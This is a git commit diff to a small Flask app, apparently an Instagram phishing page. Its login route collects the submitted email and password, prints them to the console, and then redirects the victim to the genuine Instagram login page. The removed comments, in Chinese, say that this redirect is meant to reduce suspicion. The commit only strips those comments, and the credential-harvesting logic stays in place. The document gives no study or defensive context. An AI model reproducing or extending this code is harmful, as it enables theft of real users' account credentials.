8a61b1f68e452dfc62bf023c31d4aa35330a5dda
Neko <150927792+Nekomi1210@users.noreply.github.com>
2026-04-14 11:58:17 +0800

    Update app.py

--- app.py
+++ app.py
@@ -8,7 +8,6 @@ def index():
 
 @app.route('/login', methods=['POST'])
 def login_intercept():
-    # 這裡的 key 要跟上面 JS 設定的 name 一致
     user = request.form.get('email')
     pwd = request.form.get('pass')
 
@@ -17,8 +16,6 @@ def login_intercept():
     print(f"密碼: {pwd}")
     print(f"---------------")
 
-    # 模擬「錯誤訊息」：導回原頁面並帶入錯誤參數
-    # 或者直接導向真實 IG 減少懷疑
     return redirect("https://www.instagram.com/accounts/login/?source=auth_switcher")
 
 if __name__ == '__main__':
